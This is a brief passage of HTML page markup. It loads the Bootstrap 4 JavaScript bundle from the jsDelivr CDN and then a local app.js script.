src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
